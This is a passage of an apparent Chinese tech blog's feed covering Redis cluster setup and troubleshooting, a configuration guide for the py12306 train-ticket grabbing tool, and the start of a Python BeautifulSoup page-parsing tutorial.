stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="keyword">u</span>+x redis_start_all.<span class="keyword">sh</span></span><br><span class="line">sudo ./redis_start_all.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></p><p>完成以上流程之后，就是万事俱别，只欠东风了。这时我们将准备的redis-trib.rb文件传输到redis-cluster路径中，然后执行以下命令，集群即可搭建完成：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./redis-trib.rb create --replicas <span class="number">1</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7001</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7002</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7003</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7004</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7005</span>  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.198</span>:<span class="number">7006</span></span><br></pre></td></tr></table></figure></p><h2 id="3-3-错误解决"><a href="#3-3-错误解决" class="headerlink" title="3.3 错误解决"></a>3.3 错误解决</h2><p>在以上redis集群搭建的过程中，可能会遇到以下一些错误，我们可以通过对应的方法来进行解决（以下只是博主在搭建过程中所遇到的一些问题，可能不会很全面，如有遇到新error的话请留言，博主会再进一步更新）：</p><ul><li>error1</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./redis-trib.rb create --replicas <span class="number">1</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7001</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7002</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7003</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7004</span> <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7005</span>  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">7006</span></span><br></pre></td></tr></table></figure><p>在使用ruby脚本来执行以上命令的过程中，可能会遇到如下错误：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ERR] <span class="keyword">Node</span> <span class="title">192</span>.<span class="number">168.31</span>.<span class="number">103</span>:<span class="number">7001</span> is not configured as a cluster <span class="keyword">node</span>.<span class="title"></span></span><br></pre></td></tr></table></figure><p>这是因为没有将redis.conf配置文件中的cluster-enable yes的注释去掉，只要返回编辑redis.conf即可解决。</p><ul><li>eroor2</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">WARNING: </span>redis-trib.rb is not longer available!</span><br></pre></td></tr></table></figure><p>如果你使用的是redis5.0版本的redis，然后将./src/redis-trib.rb文件复制到redis-cluster文件夹中，然后执行命令过程中可能会出现以上错误，这时我们需要将redis-cluster中的redis-trib.rb Ruby文件删除，然后下载redis3.0并取其中的redis-trib.rb文件传输到redis-cluster文件中即可解决<br><a href="http://download.redis.io/releases/" target="_blank" rel="noopener">http://download.redis.io/releases/</a></p><h2 id="四、集群的使用"><a href="#四、集群的使用" class="headerlink" title="四、集群的使用"></a>四、集群的使用</h2><p>进入redis01<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> redis01/bin</span><br><span class="line"><span class="string">./redis-cli</span> -p 7001 -c  <span class="comment"># -c参数说明是集群</span></span><br></pre></td></tr></table></figure></p><h2 id="五、图片服务器的搭建"><a href="#五、图片服务器的搭建" class="headerlink" title="五、图片服务器的搭建"></a>五、图片服务器的搭建</h2><ul><li><p>安装libevent</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> libevent</span><br></pre></td></tr></table></figure></li><li><p>解压libfastcommon</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf libXXX</span><br><span class="line"><span class="keyword">cd</span> libXXX</span><br><span class="line"><span class="string">./make</span></span><br><span class="line"><span class="string">./make</span> install</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;学习Redis的正确方式&quot;&gt;&lt;a href=&quot;#学习Redis的正确方式&quot; class=&quot;headerlink&quot; title=&quot;学习Redis的正确方式&quot;&gt;&lt;/a&gt;&lt;center&gt;学习Redis的正确方式&lt;/center&gt;&lt;/h1&gt;&lt;h2 id=&quot;一、redis五种数据类型&quot;&gt;&lt;a href=&quot;#一、redis五种数据类型&quot; class=&quot;headerlink&quot; title=&quot;一、redis五种数据类型&quot;&gt;&lt;/a&gt;一、redis五种数据类型&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;String：key-value  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;redis命令不区分大小写，但是key区分的&lt;br&gt;redis中的数据都是字符串。&lt;br&gt;redis是单线程，（不适合存储比较大的数据）&lt;/p&gt;
&lt;p&gt;使用incr  命令，如果key 不存在，会自动创建key 并自动+1.&lt;br&gt;redis中所有的数据都是字符串。&lt;/p&gt;
 &lt;figure class=&quot;highlight q&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;value&lt;/span&gt; 设置值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;key&lt;/span&gt; 获取值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;incr &lt;span class=&quot;built_in&quot;&gt;key&lt;/span&gt; 加一&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;decr &lt;span class=&quot;built_in&quot;&gt;key&lt;/span&gt; 减一&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;img src=&quot;https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=710172131,3044592445&amp;fm=26&amp;gp=0.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="https://muzimz.cn/categories/Java/"/>
    
    
      <category term="Java" scheme="https://muzimz.cn/tags/Java/"/>
    
      <category term="Redis" scheme="https://muzimz.cn/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>12306自动化抢票</title>
    <link href="https://muzimz.cn/2019/02/13/12306%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%A2%E7%A5%A8/"/>
    <id>https://muzimz.cn/2019/02/13/12306自动化抢票/</id>
    <published>2019-02-13T01:56:43.000Z</published>
    <updated>2019-04-22T08:48:18.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="瞎扯"><a href="#瞎扯" class="headerlink" title="瞎扯"></a>瞎扯</h2><p>不知不觉，这年也算是过完了。</p><p>于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=567216776,4167239058&fm=26&gp=0.jpg"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。</p><p>前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">https://github.com/pjialin/py12306</a>，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。        </p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>该项目需要在python3.6以上版本才能使用，操作系统windowns、linux、mac（亲测有效）都可以，这里我们使用windows为例。</p><ul><li>首先，我们需要前往github仓库下载下载该12306抢票项目（py12306），git的下载在这里就不再说明了，不清楚的可以跳至：<a href="https://jacklxj.github.io/2018/09/10/Hexo-Github%E5%BB%BA%E7%AB%99/" target="_blank" rel="noopener">Git安装</a>，安装好后我们通过如下命令来进行下载：</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/pjialin/py12306</span><br></pre></td></tr></table></figure><ul><li>在安装好python3.6以上版本之后，我们还需要安装其他支持工具，这里python建议下载Anaconda，下载及安装操作见：<a href="https://jacklxj.github.io/2018/09/23/Xshell远程连接linux并远程访问ipython服务/" target="_blank" rel="noopener">Anaconda下载及安装</a>，python安装好后，我们在终端执行如下命令来下载支持工具：</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install redis==<span class="number">3.0</span><span class="number">.1</span></span><br><span class="line">pip install Flask-JWT-Extended==<span class="number">3.15</span><span class="number">.0</span></span><br><span class="line">pip install requests-html==<span class="number">0.9</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><ul><li><p>随后，我们复制<code>/py12306/env.py.example</code>文件并将复制后的文件命名为<code>env.py</code>。</p></li><li><p>打开浏览器使用目标12306账号登录12306官网并添加抢票乘客（可多个，注意将身份证等信息填写正确，学生需要额外填写相关信息）。</p></li><li><p>使用sublime编辑器（亦或其他）打开上述复制的<code>env.py</code>文件，并将12306账号、车次、时间等信息配置完成，主要配置说明如下：</p></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"># 设置一：<span class="number">12306</span>抢票账号</span><br><span class="line">USER_ACCOUNTS = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'key'</span>: <span class="number">0</span>,  # <span class="number">12306</span>账号id1，用于区分不同抢票账号</span><br><span class="line">        <span class="string">'user_name'</span>: [username1],   # <span class="number">12306</span>账号用户名<span class="number">1</span></span><br><span class="line">        <span class="string">'password'</span>: [password1],   # <span class="number">12306</span>账号用户密码<span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    # &#123;</span><br><span class="line">    #     <span class="string">'key'</span>: <span class="number">2</span>,  # <span class="number">12306</span>账号id2</span><br><span class="line">    #     <span class="string">'user_name'</span>: [username2],     # 用户<span class="number">2</span></span><br><span class="line">    #     <span class="string">'password'</span>: [password2],    # 密码<span class="number">2</span></span><br><span class="line">    # &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 设置二： 打码平台，用于验证码识别</span><br><span class="line"># 打码平台账号</span><br><span class="line"># 目前只支持免费打码接口 和 若快打码，注册地址：http:<span class="comment">//www.ruokuai.com/login</span></span><br><span class="line">AUTO_CODE_PLATFORM = <span class="string">'free'</span>  # 免费填写 free 若快 ruokuai  # 免费打码无法保证持续可用，如失效请手动切换</span><br><span class="line">AUTO_CODE_ACCOUNT = &#123;  # 使用 free 可用省略</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'your user name'</span>,</span><br><span class="line">    <span class="string">'pwd'</span>: <span class="string">'your password'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 设置三：邮箱配置，用于抢票成功通知</span><br><span class="line">EMAIL_ENABLED = <span class="number">1</span>  # 是否开启邮件通知</span><br><span class="line">EMAIL_SENDER = <span class="string">'XXX@qq.com'</span>  # 邮件发送者</span><br><span class="line">EMAIL_RECEIVER = [<span class="string">'XXX1@qq.com'</span>, <span class="string">'XXX2@qq.com'</span>]  # 邮件接受者，可以多个 </span><br><span class="line">EMAIL_SERVER_HOST = <span class="string">'smtp.qq.com'</span>  # 邮件服务 host</span><br><span class="line">EMAIL_SERVER_USER = <span class="string">'XXX@qq.com'</span>  # 邮件服务登录用户名，我在抢票的时候使用的是qq邮件服务，自行前往qq邮箱进行设置</span><br><span class="line">EMAIL_SERVER_PASSWORD = <span class="string">'password'</span>  # 邮件服务登录密码，qq邮箱设置完成之后会有一个密码，于此处填写即可</span><br><span class="line"></span><br><span class="line"># 设置四： web管理（flask）</span><br><span class="line">WEB_ENABLE = <span class="number">1</span>  # 是否打开 Web 管理</span><br><span class="line">WEB_USER = &#123;  # 登录信息</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'password'</span></span><br><span class="line">&#125;</span><br><span class="line">WEB_PORT = <span class="number">8008</span>  # 监听端口</span><br><span class="line"># 设置完成并程序运行之后，请求http:<span class="comment">//localhost:8008登录进行管理</span></span><br><span class="line"></span><br><span class="line"># 设置五：乘客信息设置</span><br><span class="line">QUERY_JOBS = [</span><br><span class="line">    &#123;</span><br><span class="line">        # <span class="string">'job_name'</span>:  <span class="string">'bj -&gt; sz'</span>,  # 任务名称，不填默认会以车站名命名，不可重复</span><br><span class="line">        <span class="string">'account_key'</span>: <span class="number">0</span>,  # 将会使用指定账号下单，于之前的<span class="number">12306</span>账号id对应</span><br><span class="line">        <span class="string">'left_dates'</span>: [  # 出发日期 :Array，可多选，按照自己的行程排序</span><br><span class="line">            <span class="string">"2019-02-16"</span>,</span><br><span class="line">            <span class="string">"2019-02-17"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'stations'</span>: &#123;  # 车站 支持多个车站同时查询  :Dict or :List</span><br><span class="line">            <span class="string">'left'</span>: <span class="string">'亳州'</span>,     # 始发地</span><br><span class="line">            <span class="string">'arrive'</span>: <span class="string">'北京西'</span>,     # 目的地</span><br><span class="line">        &#125;,</span><br><span class="line">        #  # 多个车站示例  (建议添加多个，有时多买几站成功率会高一点)</span><br><span class="line">        # <span class="string">'stations'</span>: [&#123;</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'深圳'</span>,</span><br><span class="line">        # &#125;,&#123;  # 多个车站示例</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'广州'</span>,</span><br><span class="line">        # &#125;],</span><br><span class="line">        <span class="string">'members'</span>: [ </span><br><span class="line">            <span class="string">"张三"</span>,     # 乘客姓名，于之前<span class="number">12306</span>账号添加的乘客一致，可自动识别乘客类别</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'allow_less_member'</span>: <span class="number">0</span>,  # 是否允许余票不足时提交部分乘客</span><br><span class="line">        <span class="string">'seats'</span>: [  # 筛选座位，可多选，根据自己的倾向进行排序</span><br><span class="line">            # 可用值: 特等座, 商务座, 一等座, 二等座, 软卧, 硬卧, 动卧, 软座, 硬座, 无座</span><br><span class="line">            <span class="string">'硬卧'</span>,</span><br><span class="line">            # <span class="string">'软卧'</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'train_numbers'</span>: [  # 筛选车次 可以为空，为空则所有车次都可以提交 如 [] 注意大小写需要保持一致</span><br><span class="line">            <span class="string">"K148"</span>,</span><br><span class="line">            # <span class="string">"K1172"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'except_train_numbers'</span>: [  # 筛选车次，排除车次  train_numbers 和 except_train_numbers 不可同时存在</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'period'</span>: &#123;  # 筛选时间</span><br><span class="line">            <span class="string">'from'</span>: <span class="string">'00:00'</span>,</span><br><span class="line">            <span class="string">'to'</span>: <span class="string">'24:00'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">   </span><br><span class="line">   # 如若有其他<span class="number">12306</span>账号进行抢票，可在此列表中进行添加，添加内容同上</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>于此，该项目的设置基本完成，之后我们运行<code>main.py</code>主程序即可，命令如下：</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ./py12306 $$ <span class="keyword">python</span> main.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p>运行结果示例如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/024f78f0f736afc36188d855bd19ebc4b745127d.jpg" width="500"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上内容仅为该项目的部分功能，如若像了解该项目更多信息，可前往项目地址:<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">py12306</a></p><p>py12306交流群：<a href="http://shang.qq.com/wpa/qunwpa?idkey=8eab0b6402096266a62263c1cd452149926adb5cba7a2b7a98a5adc65869addf" target="_blank" rel="noopener">274781597</a></p><p>最后，感谢作者的用心良苦，希望这个工具能够帮助到大家。</p><p><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=214493079,1571383568&fm=26&gp=0.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;瞎扯&quot;&gt;&lt;a href=&quot;#瞎扯&quot; class=&quot;headerlink&quot; title=&quot;瞎扯&quot;&gt;&lt;/a&gt;瞎扯&lt;/h2&gt;&lt;p&gt;不知不觉，这年也算是过完了。&lt;/p&gt;
&lt;p&gt;于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=567216776,4167239058&amp;fm=26&amp;gp=0.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。&lt;/p&gt;
&lt;p&gt;前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：&lt;a href=&quot;https://github.com/pjialin/py12306&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/pjialin/py12306&lt;/a&gt;，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。        &lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://muzimz.cn/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://muzimz.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="12306" scheme="https://muzimz.cn/tags/12306/"/>
    
  </entry>
  
  <entry>
    <title>网页爬虫之页面解析</title>
    <link href="https://muzimz.cn/2019/01/01/%E7%BD%91%E9%A1%B5%E7%88%AC%E8%99%AB%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90/"/>
    <id>https://muzimz.cn/2019/01/01/网页爬虫之页面解析/</id>
    <published>2018-12-31T16:18:51.000Z</published>
    <updated>2019-04-22T08:48:19.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如<a href="https://baike.baidu.com/item/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0/25476?fr=aladdin" target="_blank" rel="noopener">《死亡笔记》</a>中L·Lawliet这一角色所提到的<a href="https://baike.baidu.com/item/大数定律/410082?fr=aladdin" target="_blank" rel="noopener">大数定律</a>，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。</p><a id="more"></a><h2 id="内容扼要"><a href="#内容扼要" class="headerlink" title="内容扼要"></a>内容扼要</h2><p>常用的解析方式主要有正则、Beautiful Soup、XPath、pyquery，本文主要是讲解后三种工具的使用，而对正则表达式的使用不做讲解，对正则有兴趣了解的读者可以跳转：<a href="https://baike.baidu.com/item/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1700215?fr=aladdin" target="_blank" rel="noopener">正则表达式</a></p><ul><li><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">Beautiful Soup</a>的使用</li><li><a href="https://www.w3.org/TR/xpath/all/" target="_blank" rel="noopener">XPath</a>的使用</li><li><a href="https://pythonhosted.org/pyquery/" target="_blank" rel="noopener">pyquery</a>的使用</li><li>Beautiful Soup、XPath、pyquery解析<a href="https://hr.tencent.com/" target="_blank" rel="noopener">腾讯招聘网</a>案例</li></ul><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>Beautiful Soup是Python爬虫中针对HTML、XML的其中一个解析工具，熟练的使用之可以很方便的提取页面中我们想要的数据。此外，在Beautiful Soup中，为我们提供了以下四种解析器：</p><ul><li>标准库，<code>soup = BeautifulSoup(content, &quot;html.parser&quot;)</code></li><li>lxml解析器，<code>soup = BeautifulSoup(content, &quot;lxml&quot;)</code></li><li>xml解析器，<code>soup = BeautifulSoup(content, &quot;xml&quot;)</code></li><li>html5lib解析器，<code>soup = BeautifulSoup(content, &quot;html5lib&quot;)</code></li></ul><p>在以上四种解析库中，lxml解析具有解析速度快兼容错能力强的merits，所以本文主要使用的是lxml解析器，下面我们主要拿百度首页的html来具体讲解下Beautiful Soup的使用：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(BeautifulSoup(response.text, <span class="string">"lxml"</span>))</span><br></pre></td></tr></table></figure><p>代码解读：</p><ul><li><code>response = requests.get(&quot;https://www.baidu.com&quot;)</code>，requests请求百度链接</li><li><code>encoding = response.apparent_encoding</code>，获取页面编码格式</li><li><code>response.encoding = encoding</code>，修改请求编码为页面对应的编码格式，以避免乱码</li><li><code>print(BeautifulSoup(response.text, &quot;lxml&quot;))</code>，使用lxml解析器来对百度首页html进行解析并打印结果</li></ul><p>打印后的结果如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"IE=Edge"</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"always"</span> <span class="attr">name</span>=<span class="string">"referrer"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 